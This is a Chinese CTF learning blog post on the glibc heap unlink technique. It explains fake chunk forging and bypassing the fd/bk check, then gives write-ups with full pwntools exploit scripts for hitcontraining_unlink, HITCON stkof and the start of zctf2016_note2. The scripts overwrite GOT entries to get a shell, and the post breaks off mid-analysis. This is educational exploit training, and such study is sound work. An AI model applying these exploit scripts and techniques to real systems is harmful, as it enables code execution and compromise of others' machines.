    <entry>
      <title>关于unlink的学习总结</title>
      <link href="/posts/afa5cfa3.html"/>
      <url>/posts/afa5cfa3.html</url>
      
        <content type="html"><![CDATA[<p>关于unlink的学习总结，<strong>我打算分成4个部分来说明，分别是unlink的利用整体思路、如何伪造fake_chunk、探究下unlink漏洞是如何实现的、相关题目的WP</strong>。我这篇博客并没有画图片来说明unlink的操作，我认为不是特别适合完全不懂unlink的师傅来参考学习，建议去看一些其他师傅一些画图说明unlink的博客，对unlink有个模糊的认识后，再看这篇文章应该效果最好</p><h2 id="对unlink的总结：">对unlink的总结：</h2><p>1、unlink的整体利用思路为</p><p>①、利用溢出伪造fake_chunk</p><p>②、free掉引线堆块（也就是被溢出修改prev_size和size的chunk），从而触发unlink（注意chunk别跟top chunk合并了），同时引线堆块的大小一定要大于等于0x80，避免被free掉给放进了fastbin中。</p><p>③、最后效果为fake_chunk的地址改为&amp;P-0x18</p><p>④、通过edit功能修改bss段存放的chunk信息，进行泄露函数真实地址以及篡改函数的got表，从而获取shell。</p><p>2、fake_chunk未必非要和引线堆块相邻，只要让引线堆块的地址减去自身的prev_size可以找到fake_chunk即可</p><blockquote><p>什么时候考虑unlink？ 目前以我做题的情况来看，通常不开PIE，并且存在堆溢出的时候，是可以考虑unlink的。</p></blockquote><h2 id="构造fake-chunk">构造fake_chunk</h2><p>利用unlink之前，要构造好fake_chunk（这个chunk并不是申请出来的，而是写入精心构造的数据伪造的chunk）为之后的unlink做铺垫，这个fake_chunk有三个关键部分。</p><p>第一、fake_chunk需要伪造自己的prev_size和size（这个prev_size填充成0即可），size位最小为0x20（因为要装fd和bk还要溢出下个chunk的prev_size和size）同时size需要与下一个chunk的prev_size位保持一致（PREV_INUSE位最好为1)。</p><p>第二、fake_chunk(这个fake_chunk要构造成释放状态的,这样fd和bk才有意义)的fd和bk设置成&amp;fake_chunk-0x18和&amp;fake_chunk-0x10。（这里指的&amp;fake_chunk,就是bss段上存放chunk的地址）</p><p>第三、要将下一个chunk(相当于写入数据的chunk来说，我习惯将高地址的chunk称为下)的prev_size和size进行溢出修改，prev_size要修改为fake_chunk的大小（如果fake_chunk没有和下一个chunk相邻，那么需要保证下一个chunk的地址减去prev_size的值，正好可以找到fake_chunk），而size就是写成原本这个chunk的大小，但是PREV_INUSE位要改写成0（用来声明上一个堆块是free状态）。</p><p>然后free掉高地址的chunk，此时程序检测到了这个堆块的PREV_INUSE为0，就会认为上一个堆块处于free状态，然后就会触发unlink将高地址的chunk和上一个chunk合并，<strong>它怎么去找到上一个chunk的起始位置呢？它会用当前chunk的地址减去prev_size的大小找到上一个chunk的位置，但是prev_size已经被修改成了fake_size的大小，因此当前chunk的地址减去prev_size大小误把fake_chunk当做了上一个chunk</strong>，然后进行unlink操作。</p><h2 id="探究unlink漏洞是如何产生的">探究unlink漏洞是如何产生的</h2><p>下面是unlink的源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>然后下面是将源码的关键部分提取出来了</p><p>unlink宏的参数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br></pre></td></tr></table></figure><p>unlink中上来直接执行的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;      </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>if要检查（满足下面的条件，则可以通过if）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk == P || BK-&gt;fd == P</span><br></pre></td></tr></table></figure><p>通过检查后，执行的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><blockquote><p>程序是怎么找到fd和bk指针的？ 答：靠偏移，而这就给了我们伪造fd和bk的机会</p></blockquote><p>以 <code>FD-&gt;bk ==P</code>为例(64位程序），它就等价于*(FD+0x18)==P  (<strong>请注意这里是存在*()的，这里不明白的可以去学习一下C语言的指针</strong>) (0x18是因为bk指针距离堆块的起始地址有三个内存单元大小的偏移，64位程序中内存单元的大小为0x8)</p><blockquote><p>因为FD=P-&gt;fd，如果我们可以通过溢出来控制P-&gt;fd，就意味着我们控制了FD的值，考虑一下FD的值应该是什么，才能满足这个等式<code>*(FD+0x18)==P</code></p><p>答案是 FD应该为 <code>&amp;P-0x18</code> 才能满足上述等式，代换进去的式子就是这个   *(&amp;P+0x18-0x18)==P  ，因此通过了检查</p></blockquote><p>以此类推，我们让BK的值写成&amp;P-0x10，也就可以绕过检查。</p><p>先捋一下，我们现在是利用溢出的方式将P-&gt;fd (也就是FD) 和P-&gt;bk (也就是BK)分别修改为了 <code>&amp;P-0x18</code> 和 <code>&amp;P-0x10</code>  ,而我们刚刚通过了if的检查，因此现在 <code>FD-&gt;bk ==P</code> <code> BK-&gt;fd == P</code>(接下来要进行等量代换，因此这些值要记住)</p><p>接下来执行的是</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>将刚刚说过的值进行等量代换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk=BK &lt;==&gt; P=&amp;P<span class="number">-0x10</span></span><br><span class="line">BK-&gt;fd=FD &lt;==&gt; P=&amp;P<span class="number">-0x18</span></span><br></pre></td></tr></table></figure><p>因为是先执行FD-&gt;bk=BK 后执行的BK-&gt;fd=FD，也就是等同于先执行的P=&amp;P-0x10，后执行的P=&amp;P-0x18。 <strong>所以最后P的值等于&amp;p-0x18</strong></p><p>&amp;P是啥？它是P的地址，因此&amp;P指向了P。</p><p><img src="../img/2706180-20220625220421408-1786229210.png" alt=""></p><p>我们在bss段发现了&amp;P （0x1cf9030是P）</p><p>补充：由于bss段上记录了申请的chunk所在的位置，换句话说，我们申请的chunk在哪，是由bss段上记录的信息说了算。bss段是怎么记录信息的？就是用指针的方式来记录的，bss段中的内存单元中存放的就是chunk的地址，也就是说bss段上某个地址指向了申请chunk的地址（这里指的是chunk的用户地址）。</p><p>最后用两句话来说一下利用unlink漏洞的条件和unlink漏洞产生的效果。</p><blockquote><p>利用条件：利用溢出伪造一个fake_chunk，然后free掉高地址的那个堆块，触发unlink</p><p>利用后效果：最后将fake_chunk的地址（也就是P的值）修改为&amp;P-0x18，之后再往P写入数据，就可以修改bss段上存储的chunk信息了。</p></blockquote><h2 id="实战unlink">实战unlink</h2><h3 id="hitcontraining-unlink">hitcontraining_unlink</h3><h4 id="保护策略：">保护策略：</h4><p><img src="../img/2706180-20220625220447316-229285179.png" alt=""></p><h4 id="题目分析：">题目分析：</h4><p>2.23的libc，如果不想手动patch libc的话，可以试试我写的小工具 <a href="https://www.cnblogs.com/ZIKH26/articles/16243431.html">patchtup</a>。它可以自动patch 指定的libc。（效果如下）<br><img src="../img/2706180-20220625220544926-1942268274.png" alt=""></p><p>一个菜单题，同时发现了后门。<br><img src="../img/2706180-20220625220718870-1959637132.png" alt=""></p><p>不过根据以往的情况来看，在buu上的题目flag应该不会在这个位置，但总要尝试一下的。</p><p>程序的漏洞点在change_item函数里面，发现没有对写入数据的大小做检查，导致了此处可以溢出。</p><p><img src="../img/2706180-20220625220754639-1966501539.png" alt=""></p><p>同时还发现了个函数指针，下面是它被调用的地方。</p><p><img src="../img/2706180-20220625220844769-1910492971.png" alt=""></p><p>而这个指针定义在这里（下图），好巧不巧，这个指针又存在一个程序自己分配的堆块上。</p><p><img src="../img/2706180-20220625221003445-87496987.png" alt=""></p><h4 id="大致思路（没用unlink的方法）：">大致思路（没用unlink的方法）：</h4><p>考虑到有后门函数，同时没开PIE，这个后门函数是可以直接用的，这道题是2.23的libc，因此free掉的小堆块直接进fastbin里了。思路也比较简单，利用溢出篡改fd指针，将fd指针改成程序刚开始申请的chunk地址（这个chunk是存放的函数指针），再将这个堆块申请过来，此时我们就可以对这个堆块进行编辑了，直接篡改函数指针为后门函数的地址。最后选择5，执行一下后门函数即可</p><p>不过最后打远程的时候，flag确实不在那个位置。我在本地建了个flag文件，确实是可以读出来信息的。</p><p><img src="../img/2706180-20220625221102782-492232474.png" alt=""></p><h4 id="使用后门函数的exp">使用后门函数的exp</h4><p>这个的exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x400A6F\nb *0x400CDD\nc&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;下面这三行代码是我用来tmux分三屏的，不需要的话注释即可&quot;&quot;&quot;</span></span><br><span class="line">os.system(<span class="string">&#x27;tmux select-pane -L&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux split-window&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;tmux set mouse on&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the name of item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Please enter the index of item:&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400D49</span></span><br><span class="line">payload1=p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)<span class="comment">#添加0x21的目的是为了通过fastbin中的检查</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">remove(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">change(<span class="string">&#x27;0&#x27;</span>,<span class="number">0x20</span>,payload1)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(backdoor)</span><br><span class="line">add(<span class="number">0x10</span>,payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这个思路非常简单，简单到我这个刚刚接触堆的菜鸡都感觉没必要写过程了，我就简单记录下我当时思考的三个“蠢”问题吧。</p><blockquote><p>最开始的存放函数指针的堆块已经存在了，为什么要再把这个堆块申请一次？</p><p>答：因为最开始这个堆块并不在记录的堆块索引中，换句话说我们无法去编辑这个堆块（因为没有它的索引），但是我们申请的堆块是都有索引的，因此需要再把存在函数指针的堆块申请一次。</p></blockquote><blockquote><p>为啥不能直接把fd指针改成后门函数的地址，然后直接申请回来？</p><p>第一没意义，第二malloc从fastbin中申请的堆块会进行一个检查（判断我们需要堆块的大小是否等于该fastbin中的堆块大小），这个检查过不了，因为fastbin这个里面的chunk是通过修改fd指针来伪造的，取对应size的时候肯定是有问题的</p></blockquote><blockquote><p>咋把fd指针改成第一个chunk的地址？</p><p>先申请三个堆块，把第一个堆块（是我们主动申请的第一个堆块，不是程序自己申请的堆块）当作溢出堆块，然后分别释放第二个堆块和第三个堆块，从而让fastbin中出现两个空闲堆块，此时的第二个堆块的fd指针指向了第三个堆块的地址。最后发现每次程序自己申请的那个堆块末尾都是00，因此我们只需要把第二个堆块的fd指针末尾写成00即可。考虑到程序会在我们输入的末尾加个00，因此我们只需要写入0x20字节的数据（用send发送），00自动就写入进去了。</p></blockquote><h4 id="大致思路（使用unlink">大致思路（使用unlink)</h4><p>在show函数中，printf %s打印的信息是bss段存放的地址所指向的数据。可是现在我们已经可以去修改bss段存放的地址了，那只需要让bss段上存一个函数的got表，那么执行show即可进行泄露函数的真实地址。</p><p><img src="../img/2706180-20220625221127777-789320050.png" alt=""></p><p>在change函数中，read写入的是bss段存放的地址所指向的信息，我们已经可以去修改bss段存放的地址，因此在bss段上存一个函数的got表，那么在执行change的时候，就可以修改函数的got表。</p><p><img src="../img/2706180-20220625221256721-137146817.png" alt=""></p><p>最终这道题的思路就是伪造一个fake_chunk，然后free掉一个堆块，触发unlink与fake_chunk合并，让fake_chunk的地址改为&amp;p-0x18，此时往fake_chunk中写入数据，就相当于往bss段上写入数据，进行篡改bss段存放的chunk信息（写入atoi函数的got表覆盖第1个chunk的地址），然后执行show函数泄露atoi的真实地址，再执行change函数，修改atoi函数的got表为system地址，最后输入/bin/sh获取shell。</p><h4 id="EXP">EXP:</h4><p>直接用下面这个脚本是打不通的，我自己写了个tools模块，使用了里面自己定义的函数，如果想使用下面脚本的话可以在<a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里</a>获取tools的源码，然后创建一个名为tools的py文件，或者删去我自定义的函数即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27507</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400C27,0x400CDD)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,lenth,context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbbbbb&#x27;</span>)<span class="comment">#为什么要申请一个0x80大小的chunk?因为如果小于了0x80的chunk，free掉后会进入fastbin，而fastbin中是不会进行合并操作的。申请0x80再加上0x10的头部free掉后就可以到unsortedbin</span></span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span> <span class="comment">#这个地址为写入数据的chunk的地址</span></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,fake)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi_addr&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=local_search(&#x27;atoi&#x27;,atoi_addr,libc)</span></span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(sys_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220625221316198-16141362.png" alt=""></p><h3 id="2014-HITCON-stkof">2014 HITCON stkof</h3><p>这道题跟hitcontraining_unlink题目都是一样的手法，利用unlink达到修改函数got表的目的。唯一的区别就是这道题没有%s寻址泄露，也就是无法将got表写到chunk地址（bss段记录chunk信息的位置）执行打印函数进行泄露。所以需要先劫持free函数的got表为puts函数的plt表，然后再将chunk地址改为puts的got地址，free掉改为puts的got地址那个堆块，即可进行泄露。</p><p>下面简单分析一下这道题，首先这道题是没有菜单的，根据里面的功能自己找一下就行了。</p><p><img src="../img/2706180-20220625221844974-83069417.png" alt=""></p><p>这道题有个点是以前不知道的。一般的题目都会使用setbuf关闭缓冲区，但是这道题没有使用setbuf关闭缓冲区，然后使用printf和fgets的时候发现他们也各自申请了一个堆块。为了探究原因si进去单步调试了一下，发现是调用了_IO_file_doallocate函数，然后这个函数调用了malloc。_IO_file_doallocate的作用是分配输入缓冲区。因此原因为printf先将数据输出到缓冲区中，由于最开始没有缓冲区，因此需要使用malloc进行申请。将数据先存放到这个刚申请的缓冲区里，等碰见fflush函数再进行输出。</p><h4 id="大致思路">大致思路</h4><p>整体思路，利用溢出构造fake_chunk，然后释放引线堆块(就是fake_chunk下面（高地址）的那个chunk)，此时已经可以去修改bss段上存储的chunk信息，由于不能直接寻址泄露函数的真实地址。因此需要去用puts来进行寻址泄露。先将free的got地址改为puts的plt地址，因为传给puts的参数是一个指针，然后puts就会进行寻址泄露，因此只要bss地址存放的chunk地址改成puts的got表，然后free掉这个位置的chunk(此时已经是puts的got表了，而且free被劫持成了puts),就可以泄露出来函数的真实地址了。然后同样的手法修改free的got表为system的地址就行，最后free掉装有/bin/sh的chunk即可获取shell。<br>tools这个函数库的源码在这 <a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">here</a></p><h4 id="EXP-v2">EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26316)</span></span><br><span class="line">debug(p,<span class="number">0x400B7A</span>,<span class="number">0x400A87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x602150</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2 unlink</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3 lead chunk</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5 prevent merge</span></span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(<span class="number">0</span>)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(puts_plt_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line">payload=p64(sys_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220625221902497-1011860752.png" alt=""></p><h3 id="zctf2016-note2">zctf2016_note2</h3><h4 id="保护策略">保护策略</h4><p><img src="../img/2706180-20220625221916782-1505040812.png" alt=""></p><h4 id="程序分析">程序分析</h4><p><img src="../img/2706180-20220625221927065-1302076520.png" alt=""></p><p>漏洞点在这里,在比较的时候，拿了无符号数和有符号数做比较，程序会自动将其转化为无符号数来判断，也就是a2我们输入成0，那就是-1&gt;i，把-1转化成无符号数0xffffffff。因此输入的内容就成了0xffffffff字节的数据。毫无疑问这里存在了溢出。</p><p>不过由于输入的是0，因此malloc申请chunk的时候，自然就申请了0x20字节的chunk（0x10的chunk头，0x10的最小用户空间）</p><p>为什么要先提这里，难道edit函数不存在溢出漏洞么？下面分析一下。</p><p><img src="../img/2706180-20220625222007500-1812777143.png" alt=""></p><p>这里就要了个索引，然后就可以往里面输入数据了，最多能输入144字节的数据。似乎只要申请一个小点的chunk，用edit也能溢出，然后unlink。</p><p>但是有一个地方要注意到，edit函数确实可以溢出，但是会被00截断，因为下面strlen函数。</p><p><img src="../img/2706180-20220625222019802-1809134741.png" 